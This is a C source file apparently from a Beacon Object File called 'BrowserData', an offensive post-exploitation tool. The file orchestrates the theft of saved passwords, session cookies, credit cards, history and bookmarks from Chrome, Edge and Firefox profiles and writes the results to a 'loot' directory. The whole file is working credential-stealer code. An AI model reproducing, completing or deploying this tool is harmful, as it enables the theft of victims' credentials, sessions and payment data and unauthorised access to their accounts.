/* bd_run.c - orchestration: iterate browsers, run extractors, summarize. */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "bd.h"

/* crash breadcrumbs: unbuffered fd-2 writes survive an access violation */
extern int    _write(int, const void *, unsigned);
extern size_t strlen(const char *);
static void bd_trace(const char *s) {
    static const char pre[] = "[T] ";
    _write(2, pre, 4);
    if (s) _write(2, s, (unsigned)strlen(s));
    _write(2, "\n", 1);
}
#define BD_TRACE(s) bd_trace(s)

extern void  *malloc(size_t);
extern void   free(void *);
extern void  *memset(void *, int, size_t);
extern size_t strlen(const char *);
extern int    _snprintf(char *, size_t, const char *, ...);
extern int    _stricmp(const char *, const char *);
extern char  *strchr(const char *, int);
extern char  *bd_strdup(const char *s);

typedef struct {
    const char *want;
    bd_out *out;
    int     catMask;
    int     files;
    int     rows;
} runctx;

static void run_browser(const bd_browser_t *br, runctx *rc) {
    bd_out *out = rc->out;
    BD_TRACE(br->key);

    if (out->logf)
        out->logf(out->ctx, "[*] %s (%s)", br->name, br->key);

    if (br->kind == BD_KIND_FIREFOX)
        bd_firefox_for_profiles(br, rc->catMask, out, &rc->files);
    else
        bd_chromium_for_profiles(br, rc->catMask, out, &rc->files);
}

/* run the browsers named in a comma-separated list ("chrome,edge,firefox").
 * "all" (or empty) expands to every registered browser. Returns 1 if at
 * least one browser ran; unknown keys are logged and skipped. */
static int run_browsers_by_list(const char *list, runctx *rc) {
    char tmp[512];
    char *tok, *next;
    int ran = 0, i;

    if (!list || !*list || bd_str_ieq(list, "all")) {
        for (i = 0; i < bd_browser_count(); i++)
            run_browser(bd_browser_at(i), rc);
        return 1;
    }
    if (strlen(list) >= sizeof(tmp)) {
        if (rc->out->logf)
            rc->out->logf(rc->out->ctx, "[!] browser list too long");
        return 0;
    }
    _snprintf(tmp, sizeof(tmp), "%s", list);
    next = tmp;
    while (next && *next) {
        size_t tl;
        tok = next;
        next = strchr(next, ',');
        if (next) *next++ = 0;
        while (*tok == ' ' || *tok == '\t') tok++;
        tl = strlen(tok);
        while (tl && (tok[tl - 1] == ' ' || tok[tl - 1] == '\t')) tok[--tl] = 0;
        if (!*tok) continue;
        if (bd_str_ieq(tok, "all")) {
            for (i = 0; i < bd_browser_count(); i++)
                run_browser(bd_browser_at(i), rc);
            ran = 1;
        } else {
            const bd_browser_t *br = bd_browser_find(tok);
            if (br) { run_browser(br, rc); ran = 1; }
            else if (rc->out->logf)
                rc->out->logf(rc->out->ctx, "[!] unknown browser key: %s", tok);
        }
    }
    return ran;
}

int bd_run(const char *browserKey, int catMask, bd_out *out, int *rowsOut) {
    runctx rc;

    BD_TRACE("enter bd_run");
    memset(&rc, 0, sizeof(rc));
    rc.out = out;
    rc.catMask = catMask ? catMask : BD_CAT_ALL;

    if (out->outDir && *out->outDir) {
        out->outDir = bd_strdup(out->outDir);
        bd_mkdir(out->outDir);
    } else {
        out->outDir = NULL;   /* stdout mode: loot printed, no files written */
    }

    if (out->logf) {
        if (out->outDir)
            out->logf(out->ctx, "[*] BrowserData BOF - loot dir: %s", out->outDir);
        else
            out->logf(out->ctx, "[*] BrowserData - stdout mode (no files; use -o <dir> to save)");
    }

    /* only iterate browsers when a per-browser category is requested */
    if (!(rc.catMask & (BD_CAT_PASSWORDS|BD_CAT_COOKIES|BD_CAT_HISTORY|BD_CAT_DOWNLOADS|BD_CAT_CREDITCARDS|BD_CAT_BOOKMARKS)))
        goto done_browsers;

    if (!run_browsers_by_list(browserKey, &rc))
        return -1;

done_browsers:
    if (out->logf) {
        if (out->outDir)
            out->logf(out->ctx, "[=] done: %d loot file(s) in %s", rc.files, out->outDir);
        else
            out->logf(out->ctx, "[=] done (%d row groups, stdout only)", rc.files);
    }
    if (rowsOut) *rowsOut = rc.rows;
    free((void *)out->outDir);
    out->outDir = NULL;
    return rc.files;
}

/* helper to build a cat mask from a comma list: "passwords,cookies" or "all" */
int bd_cat_mask_parse(const char *spec) {
    char tmp[256];
    char *tok, *next;
    int mask = 0;
    if (!spec || !*spec || bd_str_ieq(spec, "all")) return BD_CAT_ALL;
    if (strlen(spec) >= sizeof(tmp)) return BD_CAT_ALL;
    _snprintf(tmp, sizeof(tmp), "%s", spec);
    next = tmp;
    while (next && *next) {
        tok = next;
        next = strchr(next, ',');
        if (next) *next++ = 0;
        while (*tok == ' ') tok++;
        if (bd_str_ieq(tok, "passwords") || bd_str_ieq(tok, "password")) mask |= BD_CAT_PASSWORDS;
        else if (bd_str_ieq(tok, "cookies") || bd_str_ieq(tok, "cookie")) mask |= BD_CAT_COOKIES;
        else if (bd_str_ieq(tok, "history")) mask |= BD_CAT_HISTORY;
        else if (bd_str_ieq(tok, "downloads")) mask |= BD_CAT_DOWNLOADS;
        else if (bd_str_ieq(tok, "creditcards") || bd_str_ieq(tok, "cards")) mask |= BD_CAT_CREDITCARDS;
        else if (bd_str_ieq(tok, "bookmarks")) mask |= BD_CAT_BOOKMARKS;
    }
    return mask ? mask : BD_CAT_ALL;
}
